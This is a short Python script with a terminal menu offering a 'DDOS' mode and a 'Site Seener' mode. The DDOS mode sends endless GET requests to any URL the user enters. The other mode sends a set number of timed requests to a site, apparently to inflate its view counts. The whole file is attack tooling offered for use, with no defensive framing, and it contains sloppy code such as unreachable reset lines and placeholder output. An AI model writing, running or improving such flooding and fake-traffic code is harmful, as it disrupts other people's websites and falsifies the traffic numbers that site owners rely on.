from pyfiglet import Figlet
from color import colored
import requests, os, sys, curses, time

################## variables ####################
welcome_text = Figlet(font ='slant')
url = ''
delay = 0
count = 0
number = 0
################## functions ####################
def spinning_cursor():
    while True:
        for cursor in '|/-\\':
            yield cursor
spinner = spinning_cursor()


def ddos(window):
	global number, url
	while True:
		requests.get(url)
		number += 1
		curses.init_pair(1, 47, curses.COLOR_BLACK)
		window.addstr(0, 0, f'site open {number}/∞' + "   " +next(spinner), curses.color_pair(1))
		window.refresh()

def site_seener(window):
	global number, url, delay, count
	while True:
		requests.get(url)
		number += 1
		curses.init_pair(2, 47, curses.COLOR_BLACK)
		window.addstr(10, 10, f'site open {number}/{count}' + "   " +next(spinner), curses.color_pair(2))
		window.refresh()
		time.sleep(delay)
		if number == count:
			break
			url = ''
			delay = 0
			count = 0
			number = 0


################## backend #####################
print(colored("sdfsd", color='green'))
print(colored("sdfsd", color='Lgreen'))

################## frontend ####################

while True:
	print("1 = DDOS 2 = Site Seener 3 = exit")
	start_app = input("Choose Of Them: ")
	if start_app == "1":
		while True:
			try:
				url = input('enter site link: ')
				requests.get(url)
				break
			except:
				print('url is not valid!')
		while True:
			try:
				curses.wrapper(ddos)
			except:
				print('url is not valid!')
				break
	elif start_app == "2":
		while True:
			try:
				url = input('enter site link: ')
				requests.get(url)
				break
			except:
				print('url is not valid!')
		while True:
			try:
				count = int(input("enter amount of seen: "))
				break
			except:
				print("enter integer vlue")
		while True:
			try:
				delay = float(input('enter time of delay per open site: '))
				break
			except:
				print("enter integer vlue")
		while True:
			try:
				curses.wrapper(site_seener)
				break
			except:
				print('url is not valid!')
				break	
	elif start_app == "3":
		break
	else:
		pass

				